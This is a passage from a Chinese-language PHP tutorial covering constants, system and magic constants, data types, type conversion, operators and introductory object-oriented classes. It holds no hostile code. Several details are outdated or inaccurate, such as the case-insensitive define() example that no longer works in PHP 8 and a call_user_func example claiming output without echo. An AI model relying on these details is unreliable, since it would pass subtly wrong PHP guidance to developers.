}

$arrayRef = &getArray();
$arrayRef[] = "apple";
echo count($arrayRef); // 输出: 1
```

(6)数组和对象的传值

数组：在 PHP 5 及以上版本中，默认情况下数组是按值传递的，但在某些情况下（如函数内部修改数组）可能会更高效地按引用传递。
  
对象：从 PHP 5 开始，对象总是按引用传递。这意味着当你将一个对象赋值给另一个变量或传递给函数时，实际上传递的是对象的引用，而不是对象的副本。因此，对对象属性的任何修改都会反映在所有引用该对象的地方。

示例：

```php
class MyClass {
    public $property = 'default';
}

function modifyObject(MyClass $obj) {
    $obj->property = 'modified';
}

$myObject = new MyClass();
modifyObject($myObject);
echo $myObject->property; // 输出: modified
```

在这个例子中，`modifyObject` 函数接收到的是 `$myObject` 的引用，所以对 `$obj->property` 的修改会反映在 `$myObject` 上。

![QQ截图20241201171039.png](https://www.helloimg.com/i/2024/12/01/674c27597ef66.png)

### 5.php的常量

在 PHP 中，常量（constants）用于定义在程序运行期间不会改变的值。与变量不同，常量一旦被定义就不能再被修改或重新定义。PHP 提供了多种方式来定义和使用常量，它们在命名、作用域和定义方法上有一些特定的规则。

(2)使用 `define()` 函数
`define()` 是最常用的定义常量的方式。它接受两个参数：常量名称和常量值。可选地，还可以提供第三个参数来指定常量是否区分大小写（默认是区分大小写的）。

```php
define("GREETING", "Hello, World!");
echo GREETING; // 输出: Hello, World!
```

(3)使用 `const` 关键字
从 PHP 5.3.0 开始，可以在类外部使用 `const` 关键字来定义常量。这种方式定义的常量必须在全局作用域中定义，并且不能使用表达式作为常量值（只能使用静态值）。

```php
const PI = 3.14159;
echo PI; // 输出: 3.14159
```

(4)命名规则

常量名通常使用大写字母，并且可以包含下划线 `_` 来提高可读性。

常量是全局的，可以在定义后从任何地方访问，包括函数内部。这意味着你不需要像变量那样使用 `global` 关键字来访问常量。

一旦定义了常量，就不能再修改或重新定义它的值。

默认情况下，常量是区分大小写的。但是，你可以通过 `define()` 的第三个参数设置为不区分大小写。

示例：

```php
define("SITE_NAME", "My Website", true); // 不区分大小写
echo SITE_NAME; // 输出: My Website
echo site_name; // 输出: My Website
```

(5)类中的常量

在类中，可以使用 `const` 关键字来定义类常量。类常量是静态的，属于类本身而不是类的实例。因此，类常量可以通过类名直接访问，而不需要创建类的实例。

```php
class MyClass {
    const VERSION = '1.0.0';

    public function getVersion() {
        return self::VERSION; // 或者 MyClass::VERSION
    }
}

echo MyClass::VERSION; // 输出: 1.0.0
$object = new MyClass();
echo $object->getVersion(); // 输出: 1.0.0
```

(6)魔术常量

PHP 还提供了一些预定义的魔术常量，这些常量在不同的上下文中具有特殊的意义，会随环境变化而变化，但用户无法主动修改它。例如：

- `__LINE__`：当前行号。
- `__FILE__`：当前文件的完整路径和文件名。
- `__DIR__`：当前文件所在的目录。
- `__FUNCTION__`：当前函数名。
- `__CLASS__`：当前类名。
- `__TRAIT__`：当前 Trait 名。
- `__METHOD__`：当前方法名。
- `__NAMESPACE__`：当前命名空间名。

示例：

```php
echo __FILE__; // 输出当前文件的路径
echo __LINE__; // 输出当前行号
```
(7)检查常量是否存在

可以使用 `defined()` 函数来检查某个常量是否已经定义。

```php
if (defined("GREETING")) {
    echo GREETING;
} else {
    echo "Constant not defined.";
}
```

(8)系统常量

PHP 中的系统常量（system constants）是由 PHP 内核或扩展库预先定义的常量，它们提供了关于 PHP 环境、版本信息、配置设置等方面的数据。这些常量在不同的上下文中具有特定的意义，并且可以帮助开发者更好地理解和调试他们的应用程序。以下是 PHP 中一些常用的系统常量及其说明：

---

PHP 版本和信息

1. `PHP_VERSION`：
   - 当前 PHP 解释器的版本号。
   ```php
   echo PHP_VERSION; // 例如: 8.1.12
   ```

2. `PHP_MAJOR_VERSION`：
   - PHP 版本的主要部分（如 8）。
   ```php
   echo PHP_MAJOR_VERSION; // 例如: 8
   ```

3. `PHP_MINOR_VERSION`：
   - PHP 版本的次要部分（如 1）。
   ```php
   echo PHP_MINOR_VERSION; // 例如: 1
   ```

4. `PHP_RELEASE_VERSION`：
   - PHP 版本的修订部分（如 12）。
   ```php
   echo PHP_RELEASE_VERSION; // 例如: 12
   ```

5. `PHP_OS`：
   - 当前操作系统的信息（如 `Linux` 或 `WINNT`）。
   ```php
   echo PHP_OS; // 例如: Linux
   ```

6. `PHP_SAPI`：
   - 当前 PHP 的服务器 API（Server API），如 `cli`（命令行接口）、`apache2handler`（Apache 模块）等。
   ```php
   echo PHP_SAPI; // 例如: cli
   ```

7. `PHP_INT_MAX`：
   - PHP 中整数的最大值。
   ```php
   echo PHP_INT_MAX; // 例如: 9223372036854775807 (64位系统)
   ```

8. `PHP_INT_SIZE`：
   - PHP 中整数的字节大小（通常是 4 或 8）。
   ```php
   echo PHP_INT_SIZE; // 例如: 8 (64位系统)
   ```

9. `PHP_FLOAT_DIG`：
   - 可以安全地存储在浮点数中的最大有效数字位数。
   ```php
   echo PHP_FLOAT_DIG; // 例如: 15
   ```
---
路径和文件相关

1. `__FILE__`：
   - 当前文件的完整路径和文件名。
   ```php
   echo __FILE__; // 输出当前文件的完整路径和文件名
   ```

2. `__DIR__`：
   - 当前文件所在的目录。
   ```php
   echo __DIR__; // 输出当前文件所在的目录路径
   ```

3. `DIRECTORY_SEPARATOR`：
   - 目录分隔符（Windows 上是 `\`，Unix/Linux 上是 `/`）。
   ```php
   echo DIRECTORY_SEPARATOR; // 例如: /
   ```

4. `PATH_SEPARATOR`：
   - 操作系统路径分隔符（Windows 上是 `;`，Unix/Linux 上是 `:`）。
   ```php
   echo PATH_SEPARATOR; // 例如: :
   ```
---

其他系统常量

1. `PHP_EOL`：
   - 当前操作系统的换行符（Windows 上是 `\r\n`，Unix/Linux 上是 `\n`）。
   ```php
   echo "Hello" . PHP_EOL . "World"; // 输出: Hello\nWorld (在 Unix/Linux 上)
   ```

2. `PHP_BINARY`：
   - PHP 可执行文件的路径（仅在 CLI 模式下可用）。
   ```php
   echo PHP_BINARY; // 例如: /usr/bin/php
   ```

3. `PHP_EXTENSION_DIR`：
   - PHP 扩展模块的默认路径。
   ```php
   echo PHP_EXTENSION_DIR; // 例如: /usr/lib/php/20210902
   ```

4. `DEFAULT_INCLUDE_PATH`：
   - 默认的包含路径（用于 `include` 和 `require`）。
   ```php
   echo DEFAULT_INCLUDE_PATH; // 例如: .:/usr/share/php
   ```

5. `PHP_CONFIG_FILE_PATH`：
   - PHP 配置文件（`php.ini`）的路径。
   ```php
   echo PHP_CONFIG_FILE_PATH; // 例如: /etc/php/8.1/cli
   ```

6. `PHP_SHLIB_SUFFIX`：
   - 共享库文件的后缀（如 `so` 或 `dll`）。
   ```php
   echo PHP_SHLIB_SUFFIX; // 例如: so
   ```

7. `PHP_ZTS`：
   - 如果 PHP 编译为线程安全（ZTS, Zend Thread Safety）模式，则该常量存在并等于 1；否则不存在。
   ```php
   if (defined('PHP_ZTS')) {
       echo "Thread Safe";
   } else {
       echo "Not Thread Safe";
   }
   ```

8. `PHP_DEBUG`：
   - 如果 PHP 编译为调试模式，则该常量存在并等于 1；否则不存在。
   ```php
   if (defined('PHP_DEBUG')) {
       echo "Debug Mode";
   } else {
       echo "Release Mode";
   }
   ```

(8)删除常量

PHP 中的常量一旦定义就不能被删除。如果你需要一个可以在运行时修改的值，应该使用变量而不是常量。

### 6.php的数据类型

PHP 是一种动态类型的语言，这意味着变量不需要在声明时指定类型，它们的类型会根据赋值自动确定。PHP 支持多种数据类型，分为标量类型、复合类型和特殊类型。以下是 PHP 中常见的数据类型及其详细说明：

---
(1)标量类型（Scalar Types）

标量类型是最基本的数据类型，表示单一的值。

1. 布尔型 (`boolean`)：
   - 表示真或假的逻辑值。
   ```php
   $isTrue = true;
   $isFalse = false;
   ```

2. 整型 (`integer`)：
   - 用于表示整数。可以是正数、负数或零。
   ```php
   $number = 42;
   $negativeNumber = -10;
   ```

3. 浮点型 (`float` 或 `double`)：
   - 用于表示带有小数点的数字。`float` 和 `double` 在 PHP 中是同义词。
   ```php
   $pi = 3.14159;
   $e = 2.71828;
   ```

4. 字符串 (`string`)：
   - 用于表示文本。字符串可以用单引号或双引号来定义。双引号中的变量和某些转义字符会被解析。
   ```php
   $name = 'John';
   $greeting = "Hello, $name"; // 输出: Hello, John
   ```

---
(2)复合类型（Compound Types）

复合类型可以包含多个值或对象。

1. 数组 (`array`)：
   - 用于存储一组有序的值。数组可以是索引数组（使用整数键）或关联数组（使用字符串键）。
   ```php
   $fruits = ['apple', 'banana', 'orange']; // 索引数组
   $person = [
       'name' => 'John',
       'age' => 30,
       'city' => 'New York'
   ]; // 关联数组
   ```

2. 对象 (`object`)：
   - 用于表示类的实例。对象可以包含属性（成员变量）和方法（成员函数）。
   ```php
   class Person {
       public $name;
       public $age;

       public function __construct($name, $age) {
           $this->name = $name;
           $this->age = $age;
       }

       public function greet() {
           return "Hello, my name is " . $this->name;
       }
   }

   $person = new Person('John', 30);
   echo $person->greet(); // 输出: Hello, my name is John
   ```

---
(3)特殊类型（Special Types）

特殊类型用于表示一些特殊的值或状态。

1. `null`：
   - 表示没有值或空值。这是唯一可能的 `null` 值。
   ```php
   $value = null;
   ```

2. 资源 (`resource`)：
   - 表示对外部资源的引用，如数据库连接、文件句柄等。资源通常由特定的函数返回，并且需要手动释放。
   ```php
   $file = fopen("example.txt", "r");
   // 使用 $file 进行操作
   fclose($file); // 释放资源
   ```

3. `callable`：
   - 表示可以调用的值，如函数名、匿名函数或对象的方法。
   ```php
   function add($a, $b) {
       return $a + $b;
   }

   $callable = 'add';
   echo $callable(2, 3); // 输出: 5

   $anonymousFunction = function($a, $b) {
       return $a * $b;
   };
   echo $anonymousFunction(2, 3); // 输出: 6

   $object = new stdClass();
   $object->method = function() {
       return "Hello from method!";
   };
   call_user_func($object->method); // 输出: Hello from method!
   ```

---
(4)类型转换

PHP 提供了多种方式来进行类型转换，包括隐式转换和显式转换。

1.隐式转换

PHP 会在必要时自动进行类型转换。例如：

```php
$number = 42;
$string = "The number is " . $number; // $number 被隐式转换为字符串
echo $string; // 输出: The number is 42
```

2.显式转换

你也可以使用类型强制转换来明确地将一个值转换为另一种类型。

- `(int)` 或 `(integer)`：转换为整型。
- `(float)` 或 `(double)` 或 `(real)`：转换为浮点型。
- `(string)`：转换为字符串。
- `(bool)` 或 `(boolean)`：转换为布尔型。
- `(array)`：转换为数组。
- `(object)`：转换为对象。
- `(unset)`：转换为 `null`。

```php
$number = "123";
$integer = (int)$number;
echo gettype($integer); // 输出: integer
```
---
(7)类型检查

你可以使用以下函数来检查变量的类型：

- `is_int()`：检查是否为整型。
- `is_float()`：检查是否为浮点型。
- `is_string()`：检查是否为字符串。
- `is_bool()`：检查是否为布尔型。
- `is_array()`：检查是否为数组。
- `is_object()`：检查是否为对象。
- `is_null()`：检查是否为 `null`。
- `is_resource()`：检查是否为资源。
- `is_callable()`：检查是否为可调用的值。

```php
$var = 42;
if (is_int($var)) {
    echo "The variable is an integer.";
}
```

(8)`gettype()`和`settype()`

在PHP中，`gettype()` 和 `settype()` 是用于处理变量类型的内置函数。

---
gettype()

`gettype()` 函数用于获取一个变量的数据类型。它返回一个字符串，表示给定变量的类型。可能的返回值包括：

- "boolean"：布尔型
- "integer"：整型
- "double"：浮点型（PHP 文档中也称其为 "float"）
- "string"：字符串
- "array"：数组
- "object"：对象
- "resource"：资源
- "NULL"：空值
- "unknown type"：未知类型
语法：
```php
string gettype ( mixed $var )
```

示例：
```php
$var = 10;
echo gettype($var); // 输出: integer

$var = "hello";
echo gettype($var); // 输出: string
```

---
settype()

`settype()` 函数用于将一个变量转换为指定的类型。如果转换成功，该函数返回 `TRUE`；如果失败，则返回 `FALSE`。需要注意的是，`settype()` 实际上会改变传入的变量的值。

语法：
```php
bool settype ( mixed &$var , string $type )
```

`$type` 参数可以是以下之一：

- "boolean" 或 "bool"
- "integer" 或 "int"
- "float", "double" 或 "real"（三者等价）
- "string"
- "array"
- "object"
- "null"

示例：
```php
$var = "123";
if (settype($var, "integer")) {
    echo gettype($var); // 输出: integer
} else {
    echo "Type conversion failed.";
}
```

在这个例子中，字符串 `"123"` 被成功转换为了整数 `123`，并且 `gettype()` 确认了这个变化。

---

### 7.运算符

1. 算术运算符

用于执行基本的数学运算

+：加法

-：减法

*：乘法

/：除法

%：取模（求余数）

**：幂运算（自 PHP 5.6.0 起）

2. 赋值运算符

用于给变量赋值

=：简单赋值

+=, -=, *=, /=, %=, **=：复合赋值运算符

3. 比较运算符

用于比较两个值，通常在条件语句中使用

==：等于

===：全等于（类型和值都相等）

!=：不等于

<>：不等于（与 != 相同）

!==：不全等于（类型或值不同）

\<：小于

\>：大于

\<=：小于等于

\>=：大于等于

4. 逻辑运算符
4. 
用于组合多个条件表达式

&& 或 and：逻辑与

|| 或 or：逻辑或

!：逻辑非

xor：异或（两者之一为真则为真，但不是两者都为真）

5. 增量和减量运算符
用于增加或减少变量的值。

++$var：先增后取值（前置递增）

$var++：先取值后增（后置递增）

--$var：先减后取值（前置递减）

$var--：先取值后减（后置递减）

示例：

```Php
$x = 5;
echo ++$x; // 输出 6，然后 $x = 6
echo $x--; // 输出 6，然后 $x = 5
```

6. 字符串运算符

用于字符串连接

.：连接两个字符串

.=：连接并赋值

```php
$text1 = "Hello";
$text2 = "World";
echo $text1 . " " . $text2; // 输出: Hello World

$text1 .= " and " . $text2;
echo $text1; // 输出: Hello and World
```

7. 数组运算符

用于数组的操作

+：合并两个数组（不会覆盖已存在的键名，会保留左边数组的值）

==：如果两个数组有相同的键/值对，则返回 true

===：如果两个数组有相同的键/值对且顺序相同，则返回 true

8. 位运算符

用于对二进制数进行位级操作

&：按位与

|：按位或

^：按位异或

~：按位非

<<：左移

\>>：右移

```php
$a = 5; // 二进制: 0101
$b = 3; // 二进制: 0011

echo $a & $b; // 输出: 1 (0101 & 0011 = 0001)
echo $a | $b; // 输出: 7 (0101 | 0011 = 0111)
echo $a ^ $b; // 输出: 6 (0101 ^ 0011 = 0110)
echo ~$a;     // 输出: -6 (按位非操作的结果取决于系统使用的补码表示)
echo $a << 1; // 输出: 10 (0101 << 1 = 1010)
echo $a >> 1; // 输出: 2 (0101 >> 1 = 0010)
```

9. 其他运算符

? :：三元运算符，提供了一种简化的 if-else 语法

??：空合并运算符（自 PHP 7.0.0 起），用于指定默认值

```php
$age = 20;
echo ($age >= 18) ? "Adult" : "Minor"; // 输出: Adult

$username = null;
echo $username ?? "Guest"; // 输出: Guest
```

### 面向对象

在这里引用一下[菜鸟教程](https://www.runoob.com/php/php-oop.html)的介绍

面向对象（Object-Oriented，简称 OO）是一种编程思想和方法，它将程序中的数据和操作数据的方法封装在一起，形成"对象"，并通过对象之间的交互和消息传递来完成程序的功能。面向对象编程强调数据的封装、继承、多态和动态绑定等特性，使得程序具有更好的可扩展性、可维护性和可重用性。

在面向对象的程序设计（英语：Object-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。

在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。

对象的主要三个特性：

对象的行为：对象可以执行的操作，比如：开灯，关灯就是行为。

对象的形态：对对象不同的行为是如何响应的，比如：颜色，尺寸，外型。

对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。

比如 Animal(动物) 是一个抽象类，我们可以具体到一只狗跟一只羊，而狗跟羊就是具体的对象，他们有颜色属性，可以写，可以跑等行为状态。

![](https://www.runoob.com/wp-content/uploads/2016/05/animals.png)

面向对象编程的三个主要特性：

封装（Encapsulation）：指将对象的属性和方法封装在一起，使得外部无法直接访问和修改对象的内部状态。通过使用访问控制修饰符（public、private、protected）来限制属性和方法的访问权限，从而实现封装。

继承（Inheritance）：指可以创建一个新的类，该类继承了父类的属性和方法，并且可以添加自己的属性和方法。通过继承，可以避免重复编写相似的代码，并且可以实现代码的重用。

多态（Polymorphism）：指可以使用一个父类类型的变量来引用不同子类类型的对象，从而实现对不同对象的统一操作。多态可以使得代码更加灵活，具有更好的可扩展性和可维护性。在 PHP 中，多态可以通过实现接口（interface）和使用抽象类（abstract class）来实现。

面向对象内容
类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。

对象 − 是类的实例。

成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。

成员函数 − 定义在类的内部，可用于访问对象的数据。

继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。

父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。

子类 − 一个类继承其他类称为子类，也可称为派生类。

多态 − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。

重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。

抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。

封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。

构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。

析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做"清理善后" 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。

1.类定义

```php
<?php
class phpClass {
  var $var1;
  var $var2 = "constant string";
  
  function myfunc ($arg1, $arg2) {
     [..]
  }
  [..]
}
?>
```

类使用 class 关键字后加上类名定义

类名后的一对大括号({})内可以定义变量和方法

类的变量使用 var 来声明, 变量也可以初始化值

函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问

实例化

```php
<?php
class Site {
    // 使用 public, private 或 protected 声明属性
    private $url;
    private $title;

    // 构造函数可以用于初始化对象的属性
    public function __construct($url = null, $title = null) {
        if ($url !== null) {
            $this->setUrl($url);
        }
        if ($title !== null) {
            $this->setTitle($title);
        }
    }

    // 设置 URL
    public function setUrl($url) {
        $this->url = $url;
    }

    // 获取 URL
    public function getUrl() {
        return $this->url; // 返回值而不是直接输出
    }

    // 设置标题
    public function setTitle($title) {
        $this->title = $title;
    }

    // 获取标题
    public function getTitle() {
        return $this->title; // 返回值而不是直接输出
    }

    // 打印信息的方法
    public function printInfo() {
        echo "Website Title: " . $this->getTitle() . PHP_EOL;
        echo "Website URL: " . $this->getUrl() . PHP_EOL;
    }
}

// 创建 Site 类的一个实例并测试其功能
$site = new Site('https://www.example.com', 'Example Website');
$site->printInfo();

// 修改属性并再次打印
$site->setUrl('https://www.newexample.com');
$site->setTitle('New Example Website');
$site->printInfo();
?>
```

属性声明：private $url 和 private $title 是类的私有属性，这意味着它们只能在类内部访问。使用 private 修饰符可以确保这些属性不会被外部代码直接修改，从而提高了数据的安全性和封装性

构造函数：__construct() 是一个特殊的方法，在创建类的新实例时自动调用。它接受两个可选参数 $url 和 $title，用于初始化对象的属性。如果传递了这些参数，则调用相应的 setter 方法来设置属性的值。如果没有传递参数，属性将保持为 null

setUrl 方法：用于设置 $url 属性的值。通过这个方法，可以在类外部安全地修改 $url 属性，而不需要直接访问私有属性

setTitle 方法：用于设置 $title 属性的值，功能与 setUrl 类似

getUrl 方法：用于获取 $url 属性的值。返回值而不是直接输出，这样可以让调用者决定如何处理返回的数据

getTitle 方法：用于获取 $title 属性的值，功能与 getUrl 类似

printInfo 方法：用于格式化输出网站的标题和 URL。它调用了 getTitle 和 getUrl 方法来获取属性的值，并使用 echo 输出这些信息。PHP_EOL 是一个常量，表示当前平台的换行符，使得输出更加跨平台兼容

$this 只能在类的内部使用：$this 是一个关键字，只能在类的方法中使用。如果你在类外部尝试使用 $this，会导致错误

静态上下文中不可用：在静态方法或静态属性中，不能使用 $this，因为静态成员与具体的对象实例无关。在这种情况下，应该使用 self:: 或 static:: 来引用静态成员